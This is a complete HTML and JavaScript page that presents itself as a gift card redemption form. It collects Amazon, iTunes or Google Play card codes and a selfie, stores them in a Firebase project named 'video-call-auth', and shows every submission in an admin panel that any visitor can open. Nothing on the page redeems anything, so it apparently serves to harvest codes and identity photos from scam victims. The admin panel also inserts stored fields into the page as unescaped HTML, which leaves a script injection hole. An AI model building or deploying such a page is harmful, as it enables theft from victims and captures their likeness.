<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Gift Card Redemption</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 500px;
      margin: auto;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input[type="text"],
    input[type="file"] {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    .checkbox-group {
      margin: 10px 0;
    }
    .checkbox-group label {
      display: inline-block;
      margin-right: 10px;
    }
    button {
      margin-top: 15px;
      padding: 10px;
      width: 100%;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #0056b3;
    }
    #adminPanel {
      display: none;
      margin-top: 30px;
      padding: 20px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
    }
    .submission {
      padding: 10px;
      margin-bottom: 15px;
      border-bottom: 1px solid #eee;
    }
    .submission img {
      margin-top: 8px;
      border-radius: 6px;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Gift Card Redemption</h2>
    
    <label for="redemptionCode">Redemption Code:</label>
    <input type="text" id="redemptionCode" placeholder="Enter gift card code">

    <div class="checkbox-group">
      <label><input type="radio" name="cardType" value="Amazon"> Amazon</label>
      <label><input type="radio" name="cardType" value="iTunes"> iTunes</label>
      <label><input type="radio" name="cardType" value="Google Play"> Google Play</label>
    </div>

    <label for="selfie">Upload Selfie:</label>
    <input type="file" id="selfie" accept="image/*">

    <button id="submitBtn">Submit</button>
    <button type="button" onclick="openAdmin()">Open Admin Panel</button>
  </div>

  <div id="adminPanel">
    <h2>Admin Panel</h2>
    <button onclick="closeAdmin()">Close Admin Panel</button>
    <div id="submissionsList"></div>
  </div>

  <!-- ================= FIREBASE SCRIPT ================= -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { 
      getFirestore, collection, addDoc, serverTimestamp, query, orderBy, onSnapshot 
    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
    import { 
      getStorage, ref, uploadBytes, getDownloadURL 
    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";

    // üîπ Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
      authDomain: "video-call-auth-e2237.firebaseapp.com",
      projectId: "video-call-auth-e2237",
      storageBucket: "video-call-auth-e2237.appspot.com",
      messagingSenderId: "203016834335",
      appId: "1:203016834335:web:fddc9c06f433a64afcf42a",
      measurementId: "G-05HNPKVC14"
    };

    // üîπ Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const storage = getStorage(app);

    const submissionsCollection = collection(db, "submissions");

    // ==========================================================
    // üîπ Handle Submission
    // ==========================================================
    document.getElementById("submitBtn").addEventListener("click", async () => {
      const code = document.getElementById("redemptionCode").value.trim();
      const selfie = document.getElementById("selfie").files[0];

      // get selected card type (checkbox)
      const cardTypeCheckbox = document.querySelector("input[name='cardType']:checked");
      const cardType = cardTypeCheckbox ? cardTypeCheckbox.value : "N/A";

      if (!code || !selfie) {
        alert("Please enter code and upload selfie.");
        return;
      }

      try {
        console.log("üì§ Uploading selfie...");
        const storageRef = ref(storage, "selfies/" + Date.now() + "_" + selfie.name);
        await uploadBytes(storageRef, selfie);
        const selfieURL = await getDownloadURL(storageRef);

        console.log("üìù Saving to Firestore...");
        await addDoc(submissionsCollection, {
          redemptionCode: code,
          cardType: cardType,
          selfieURL: selfieURL,
          timestamp: serverTimestamp(),
          time: new Date().toLocaleString()
        });

        alert("‚úÖ Submission successful!");
      } catch (error) {
        console.error("‚ùå Error adding submission:", error);
        alert("Error: " + error.message);
      } finally {
        // Reset form so it works again
        document.getElementById("redemptionCode").value = "";
        document.getElementById("selfie").value = "";
        document.querySelectorAll('input[name="cardType"]').forEach(cb => cb.checked = false);
      }
    });

    // ==========================================================
    // üîπ Admin Panel
    // ==========================================================
    let unsubscribeAdmin = null;

    window.openAdmin = function() {
      const panel = document.getElementById("adminPanel");
      const list = document.getElementById("submissionsList");
      list.innerHTML = "";

      // remove previous listener
      if (unsubscribeAdmin) unsubscribeAdmin();

      try {
        const q = query(collection(db, "submissions"), orderBy("timestamp", "desc"));
        unsubscribeAdmin = onSnapshot(q, (snapshot) => {
          list.innerHTML = "";
          if (snapshot.empty) {
            list.innerHTML = "<p>No submissions found.</p>";
            return;
          }
          snapshot.forEach((doc) => {
            const d = doc.data();
            list.innerHTML += `
              <div class="submission">
                <p><b>Submission ID:</b> ${doc.id}</p>
                <p><b>Time:</b> ${d.time || ""}</p>
                <p><b>Redemption Code:</b> ${d.redemptionCode || "N/A"}</p>
                <p><b>Card Type:</b> ${d.cardType || "N/A"}</p>
                ${d.selfieURL ? `<img src="${d.selfieURL}" alt="Selfie" width="150">` : "<p>No image</p>"}
                ${d.error ? `<p class="error">Error: ${d.error}</p>` : ""}
              </div>
            `;
          });
        }, (err) => {
          console.error("‚ùå onSnapshot error:", err);
          list.innerHTML = `<p>Error loading data: ${err.message}</p>`;
        });
      } catch (error) {
        console.error("‚ùå openAdmin error:", error);
        list.innerHTML = `<p>Error loading data: ${error.message}</p>`;
      }

      panel.style.display = "block";
    };

    window.closeAdmin = function() {
      if (unsubscribeAdmin) unsubscribeAdmin(); // stop listener
      document.getElementById("adminPanel").style.display = "none";
    };
  </script>
</body>
</html>
